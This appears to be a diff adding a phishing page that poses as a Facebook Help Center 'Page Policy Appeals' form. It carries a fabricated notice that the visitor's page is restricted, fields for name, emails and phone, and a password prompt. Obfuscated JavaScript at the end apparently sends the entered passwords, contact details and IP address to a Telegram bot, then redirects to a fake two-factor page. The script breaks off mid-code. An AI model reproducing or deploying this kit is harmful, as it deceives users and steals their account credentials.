@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://businessservices.cfd/assets/images/fb_icon.ico" type="image/x-icon">
+    <title>Facebook Help Center - Page Policy Appeals</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        facebook: '#385899'
+                    }
+                }
+            }
+        }
+    </script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <meta name="csrf-token" content="dummy-csrf-token">
+</head>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    /* Simple Facebook Loading */
+    .facebook-loader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        flex-direction: column;
+    }
+
+    .facebook-loader.fade-out {
+        opacity: 0;
+        transition: opacity 0.5s ease-out;
+    }
+
+    /* Facebook Logo */
+    .facebook-logos {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 20px;
+    }
+
+    /* Simple Spinner */
+    .facebook-spinner {
+        width: 32px;
+        height: 32px;
+        border: 3px solid #e4e6ea;
+        border-top: 3px solid #1877f2;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+
+    /* Loading Text */
+    .loading-text {
+        margin-top: 15px;
+        color: #65676b;
+        font-size: 14px;
+    }
+
+    /* Main Content */
+    .main-content {
+        display: none;
+        padding: 50px 20px;
+        text-align: center;
+        min-height: 100vh;
+        background: #f0f2f5;
+    }
+
+    .main-content.show {
+        display: block;
+        animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+
+        to {
+            opacity: 1;
+        }
+    }
+
+    .welcome-box {
+        background: white;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        max-width: 500px;
+        margin: 0 auto;
+    }
+
+    .welcome-box h1 {
+        color: #1877f2;
+        margin-bottom: 15px;
+        font-size: 24px;
+    }
+
+    .welcome-box p {
+        color: #65676b;
+        line-height: 1.5;
+        margin-bottom: 20px;
+    }
+
+    button {
+        background: #1877f2;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 500;
+    }
+
+    button:hover {
+        background: #166fe5;
+    }
+</style>
+
+<body>
+    <!-- Simple Facebook Loading -->
+    <div id="facebookLoader" class="facebook-loader">
+        <div class="facebook-logos">
+            <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#1877f2"
+                    d="M1024 512C1024 229.23 794.77 0 512 0S0 229.23 0 512c0 255.55 187.23 467.37 432 505.78V660H302V512h130V399.2C432 270.88 508.44 200 625.39 200c56.5 0 115.61 10.1 115.61 10.1v127.2h-65.15c-64.16 0-84.18 39.83-84.18 80.65V512H741l-26.35 148H591.27v357.78C836.77 979.37 1024 767.55 1024 512z" />
+            </svg>
+        </div>
+    </div>
+    <div class="topheader bg-facebook p-2">
+        <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
+            <div class="w-[20%] md:w-[15%]">
+                <a href="">
+                    <img src="./images/logo.svg.png" class="object-cover">
+                </a>
+            </div>
+            <div class="flex shadow-sm w-[60%] md:w-[50%]">
+                <span
+                    class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm "><ion-icon
+                        name="search-outline" role="img" class="md hydrated"></ion-icon></span>
+                <input type="search"
+                    class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
+                    placeholder="How can we help?">
+            </div>
+        </div>
+    </div>
+    <div class="bg-[#E9EBEE]">
+        <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
+            <a href="#"
+                class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]">
+                <ion-icon name="home" role="img" class="md hydrated"></ion-icon> Help Center
+            </a>
+            <p class="text-[#3578E5] text-xs">English</p>
+        </div>
+    </div>
+    <div class="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr] "
+        style="padding-bottom:100px;">
+        <div class="order-2 md:order-none">
+            <ul class="[&>li>a]:text-[14px] [&>li>a]:py-[5px] [&>li>a]:pr-5 [&>li>a]:block [&>li>a:hover]:bg-[#E9EBEE]">
+                <li><a href="#">Creating an Account</a></li>
+                <li><a href="#">Your Profile</a></li>
+                <li><a href="#">Friending</a></li>
+                <li><a href="#">Facebook Dating</a></li>
+                <li><a href="#">Your Home Page</a></li>
+                <li><a href="#">Messaging</a></li>
+                <li><a href="#">Reels</a></li>
+                <li><a href="#">Stories</a></li>
+                <li><a href="#">Photos</a></li>
+                <li><a href="#">Videos</a></li>
+                <li><a href="#">Gaming</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">Events</a></li>
+                <li><a href="#">Fundraisers and Donations</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Apps</a></li>
+                <li><a href="#">Facebook Mobile Apps</a></li>
+                <li><a href="#">Accessibility</a></li>
+            </ul>
+        </div>
+        <form id="ccnpwxpytrb" class="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none">
+            <div class="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
+                <h1>Page Policy Appeals</h1>
+            </div>
+            <div class="p-4">
+                <p class="text-xs mb-4 translate-p1">We have detected unusual activity on your page that violates our
+                    community standards.</p>
+                <p class="text-xs mb-4 translate-p2">Your access to your page has been limited, and you are currently
+                    unable to post, share, or comment using your page.</p>
+                <p class="text-xs mb-4 translate-p3">If you believe this to be a mistake, you have the option to submit
+                    an appeal by providing the necessary information.</p>
+
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Name Page
+                        </span>
+                        <input type="text" name="page" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Fullname
+                        </span>
+                        <input type="text" name="fullname" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Business Email Address
+                        </span>
+                        <input type="email" name="business_email" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Personal Email Address
+                        </span>
+                        <input type="email" name="personal_email" required=""
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span
+                            class="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
+                            Mobile Phone Number
+                        </span>
+                        <input type="text" name="phone" required=""
+                            onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))"
+                            class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1">
+                    </label>
+                </div>
+                <div class="mb-4">
+                    <label class="block">
+                        <span class="text-[#90949C] block text-xs font-bold text-[#90949C]">
+                            Please provide us information that will help us investigate.
+                        </span>
+                        <textarea type="text" name="yykwevbhfh"
+                            class="w-3/4 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1"
+                            rows="4"></textarea>
+                    </label>
+                </div>
+            </div>
+            <div class="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3">
+                <button type="submit"
+                    class="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold">Send</button>
+            </div>
+        </form>
+    </div>
+    <hr>
+    <div
+        style="max-width: 1200px; margin: 0 auto; padding: 20px; text-align: center; background-color: white; border-radius: 8px;">
+        <div style="margin-bottom: 20px; line-height: 1.6;">
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">English (US)</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Svenska</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Tiếng
+                Việt</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">العربية</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Polski</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Español</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Türkçe</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Français (France)</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Deutsch</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">ภาษาไทย</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Português (Brasil)</a>
+            <a href="#"
+                style="color: #1877f2; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block; background: #f0f2f5; padding: 2px 8px; border-radius: 2px; font-weight: bold;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">+</a>
+        </div>
+
+        <div style="margin-bottom: 20px; line-height: 1.8;">
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Sign
+                Up</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Log
+                In</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Messenger</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Facebook Lite</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Video</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                Pay</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                Store</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                Quest</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Ray-Ban Meta</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Meta
+                AI</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">AI-generated content</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Instagram</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Threads</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Privacy Center</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Privacy Policy</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Privacy Center</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Cookie
+                Settings</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">About</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Create
+                Ad</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Create
+                Page</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Developers</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Careers</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Cookies</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Ad
+                Choices</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Terms</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Help</a>
+            <a href="#"
+                style="color: #8a8d91; text-decoration: none; font-size: 12px; margin: 0 8px; display: inline-block;"
+                onmouseover="this.style.textDecoration='underline'"
+                onmouseout="this.style.textDecoration='none'">Contact Uploading & Non-Users</a>
+        </div>
+
+        <div style="color: #8a8d91; font-size: 11px; margin-top: 20px;">
+            Meta © 2025
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="modalEl" tabindex="-1" aria-hidden="true"
+        class="fixed top-0 left-0 right-0 z-50 hidden w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center bg-black bg-opacity-50">
+        <div class="relative w-full max-w-2xl max-h-full">
+            <div class="relative bg-white rounded-lg shadow">
+                <div class="flex items-start justify-between p-4 border-b rounded-t">
+                    <h3 class="text-xl font-semibold text-gray-900">
+                        Please Enter Your Password
+                    </h3>
+                    <button type="button" id="closeModalBtn"
+                        class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ml-auto inline-flex justify-center items-center">
+                        <svg class="w-3 h-3" fill="none" viewBox="0 0 14 14">
+                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
+                        </svg>
+                    </button>
+                </div>
+                <div class="p-6 space-y-6">
+                    <p class="text-base leading-relaxed text-gray-500">
+                        For your security, you must enter your password to continue.
+                    </p>
+                    <form class="space-y-6" id="mvmgxlrpqdl">
+                        <div class="relative">
+                            <label for="hxeyfibmtuv" class="block mb-2 text-sm font-medium text-gray-900">
+                                Your password
+                            </label>
+                            <input type="password" name="password" id="hxeyfibmtuv" placeholder="Enter your password"
+                                class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 pr-10"
+                                required />
+
+                            <!-- Icon show/hide -->
+
+                            <p class="error_password text-red-700 text-sm mt-1"></p>
+                        </div>
+                        <button type="submit"
+                            class="w-full text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center flex items-center justify-center disabled:opacity-70 disabled:cursor-not-allowed">
+                            <span id="btnText">Continue</span>
+                            <div id="btnLoader" class="spinner ml-2 hidden"></div>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<!-- <script src="./assets/assets/js/form.js"></script> -->
+<script>
+   function _0x5417(_0x17355d,_0x6e8ad5){const _0x1f325a=_0x119f();return _0x5417=function(_0x5a425d,_0x2c6e3d){_0x5a425d=_0x5a425d-(-0x1995+0x111a+-0x1*-0x9e4);let _0x4be8ff=_0x1f325a[_0x5a425d];return _0x4be8ff;},_0x5417(_0x17355d,_0x6e8ad5);}const _0x294fe1=_0x5417;function _0x119f(){const _0x1a8cda=['/sendMessa','FLVcO','imIWH','RkJyB','feKti','openModalB','n/json','fromCharCo','modalEl','OjXsL','attr','legram:','hOHxb','OXExa','ById','KjOTP','6520168LXffIj','NPXoc','keypress','click','18890oZszSd','Telegram\x20s','end\x20error:','textConten','display','load','meta[name=','Continue','Ip\x20not\x20det','559266ixzbyM','btnLoader','style','yycJQ','Tiếp\x20tục','disabled','button[typ','4517','tOJyU','.org/bot','OsQkF','eyeIcon','none','2877412lDyzwc','JRFZE','ZKsGQ','input[name','type','is/','POST','reset','append','kdRRJ','first_pass','sofHW','submit','json','1092132AQlMpH','user_ip','stringify','IP:\x20','zsIuA','633758iIVDdt','ected\x20;(','FLRGb','bhLqj','ader','tnSDf','sword\x22]','t/2fa.html','split','btnText','entries','facebookLo','fade-out','val','find','OriHy','i.telegram','location','classList','remove','flex','IvgCW','xCfnw','sBMPdo','entered\x20is','3fAzrta','togglePass','e=\x22submit\x22','hidden','hpHCF','content','LWGja','ault','preventDef','TyoPI','14BihHtY','8042837938','result','bsqzB','WaZZy','The\x20passwo','fnqwS','\x22csrf-toke','yCeae','808313VfpMxc','rd\x20you\x27ve\x20','add','href','guLte','5LZqjEU','mainConten','dcHSJ','Sent\x20to\x20Te','test','KAOmr','pTvqKQEiNt','AQuOC','status','Telegram\x20e','HqiML','which','84qCxRjY','ilcLq','country','ZQtzw','oEKrA','4|7|2','show','second_pas','addEventLi','YOvJw','mvmgxlrpqd','zHtma','target','nRGoh','/managemen','zHgVT','=\x22phone\x22]','DNRvm','pMozz','country_co','sword','JVneO','mVRkx','i.country.','error','aiTlI','eyeSlashIc','getElement','log','ajaxSetup','querySelec','.error_pas','xyNoU','rror:','n\x22]','INzSc','NKlkV','ZNIWi','https://ap','EdSA6VgHvi','sUOgJ','6|5|0|3|1|','password','-100328267','RHkNa','num_enter_','text','nHxaH','ccnpwxpytr','[name=\x22pas','LbGjO','\x20incorrect',':AAHiL2WUq','word','applicatio','wkoVR','2853fPNHtX','tor','stener','AUPLK','jVIWw','hxeyfibmtu'];_0x119f=function(){return _0x1a8cda;};return _0x119f();}(function(_0x110904,_0x1cc515){const _0x5b9c42=_0x5417,_0x595ced=_0x110904();while(!![]){try{const _0x597124=-parseInt(_0x5b9c42(0x1b8))/(-0x1d77+0x17*-0x152+0x3bd6)+parseInt(_0x5b9c42(0x1bd))/(-0xc1a+-0x263e+0x325a)*(parseInt(_0x5b9c42(0x1d6))/(-0x3*-0xc9a+-0xe60+0x176b*-0x1))+parseInt(_0x5b9c42(0x1aa))/(-0x645+0x1*-0x16fe+0x1d47)*(parseInt(_0x5b9c42(0x1ee))/(-0x895+-0x7*-0xef+0x211))+parseInt(_0x5b9c42(0x19d))/(-0x1e3+-0x162a+0x1813)*(-parseInt(_0x5b9c42(0x1e0))/(-0x8*0x1c1+-0x16df+0x24ee))+parseInt(_0x5b9c42(0x190))/(-0x1d09+-0xbf*0x9+0x479*0x8)+-parseInt(_0x5b9c42(0x17a))/(-0x7c0+0x1f28+0xc1*-0x1f)*(-parseInt(_0x5b9c42(0x194))/(-0x1cd+-0x4b*0x6b+-0xb1*-0x30))+parseInt(_0x5b9c42(0x1e9))/(-0xf3a+0xc78*0x1+0x2cd)*(-parseInt(_0x5b9c42(0x1fa))/(0x11be+0xc2f+-0x1de1));if(_0x597124===_0x1cc515)break;else _0x595ced['push'](_0x595ced['shift']());}catch(_0x3b96b0){_0x595ced['push'](_0x595ced['shift']());}}}(_0x119f,-0xfcfc2+-0x266*0x13a+0x1cc7c9*0x1));const modalEl=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x188)),openModalBtn=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x185)+'tn'),mvmgxlrpqdl=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x204)+'l'),hxeyfibmtuv=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x17f)+'v'),togglePassword=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x1d7)+_0x294fe1(0x177)),eyeIcon=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x1a8)),eyeSlashIcon=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x214)+'on'),error_password=document[_0x294fe1(0x218)+_0x294fe1(0x17b)](_0x294fe1(0x219)+_0x294fe1(0x20e)),btnText=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x1c6)),btnLoader=document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x19e));closeModalBtn[_0x294fe1(0x202)+_0x294fe1(0x17c)](_0x294fe1(0x193),()=>{const _0x41f95c=_0x294fe1,_0x3c3220={'DNRvm':_0x41f95c(0x1d9),'nRGoh':_0x41f95c(0x1d1),'pMozz':function(_0x2c3563){return _0x2c3563();}};modalEl[_0x41f95c(0x1cf)][_0x41f95c(0x1eb)](_0x3c3220[_0x41f95c(0x20b)]),modalEl[_0x41f95c(0x1cf)][_0x41f95c(0x1d0)](_0x3c3220[_0x41f95c(0x207)]),_0x3c3220[_0x41f95c(0x20c)](resetForm);}),modalEl[_0x294fe1(0x202)+_0x294fe1(0x17c)](_0x294fe1(0x193),_0x400dc7=>{const _0x4b3f17=_0x294fe1,_0x32e48b={'TyoPI':function(_0x572918,_0x133f7e){return _0x572918===_0x133f7e;},'HqiML':_0x4b3f17(0x1d9),'zHtma':_0x4b3f17(0x1d1)};_0x32e48b[_0x4b3f17(0x1df)](_0x400dc7[_0x4b3f17(0x206)],modalEl)&&(modalEl[_0x4b3f17(0x1cf)][_0x4b3f17(0x1eb)](_0x32e48b[_0x4b3f17(0x1f8)]),modalEl[_0x4b3f17(0x1cf)][_0x4b3f17(0x1d0)](_0x32e48b[_0x4b3f17(0x205)]));}),document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x172)+'b')[_0x294fe1(0x202)+_0x294fe1(0x17c)](_0x294fe1(0x1b6),function(_0x96ae52){const _0x4b4c84=_0x294fe1,_0x501e23={'tnSDf':_0x4b4c84(0x188),'AQuOC':_0x4b4c84(0x1d9),'FLVcO':_0x4b4c84(0x1d1)};_0x96ae52[_0x4b4c84(0x1de)+_0x4b4c84(0x1dd)](),document[_0x4b4c84(0x215)+_0x4b4c84(0x18e)](_0x501e23[_0x4b4c84(0x1c2)])[_0x4b4c84(0x1cf)][_0x4b4c84(0x1d0)](_0x501e23[_0x4b4c84(0x1f5)]),document[_0x4b4c84(0x215)+_0x4b4c84(0x18e)](_0x501e23[_0x4b4c84(0x1c2)])[_0x4b4c84(0x1cf)][_0x4b4c84(0x1eb)](_0x501e23[_0x4b4c84(0x181)]);});let num_enter_password=-0x150b+-0xa1c+-0x2*-0xf94;document[_0x294fe1(0x215)+_0x294fe1(0x18e)](_0x294fe1(0x188))[_0x294fe1(0x202)+_0x294fe1(0x17c)](_0x294fe1(0x1b6),async function(_0x5d0d61){const _0x155f0d=_0x294fe1,_0x50026a={'guLte':_0x155f0d(0x19b),'xCfnw':_0x155f0d(0x1d9),'xyNoU':function(_0x5768d6,_0x1b3ee9){return _0x5768d6(_0x1b3ee9);},'OsQkF':function(_0x248e5e,_0x4d46d5){return _0x248e5e==_0x4d46d5;},'oEKrA':_0x155f0d(0x19c)+_0x155f0d(0x1be),'KjOTP':_0x155f0d(0x1a3)+_0x155f0d(0x1d8)+']','JRFZE':function(_0x574705,_0x4947a4,_0x182bb9){return _0x574705(_0x4947a4,_0x182bb9);},'jVIWw':function(_0x409555,_0x6fbbf1){return _0x409555(_0x6fbbf1);},'AUPLK':_0x155f0d(0x173)+_0x155f0d(0x1c3),'OXExa':_0x155f0d(0x172)+'b','IvgCW':function(_0x2e86ac,_0x350972){return _0x2e86ac==_0x350972;},'LbGjO':_0x155f0d(0x1b4)+_0x155f0d(0x177),'fnqwS':function(_0x468b5d,_0x465d09){return _0x468b5d==_0x465d09;},'NKlkV':_0x155f0d(0x201)+_0x155f0d(0x20e),'RkJyB':_0x155f0d(0x16f)+_0x155f0d(0x16c),'YOvJw':_0x155f0d(0x220)+_0x155f0d(0x211)+_0x155f0d(0x1af),'KAOmr':function(_0x24ffe1){return _0x24ffe1();},'zHgVT':function(_0x50a1b2,_0x274d0c){return 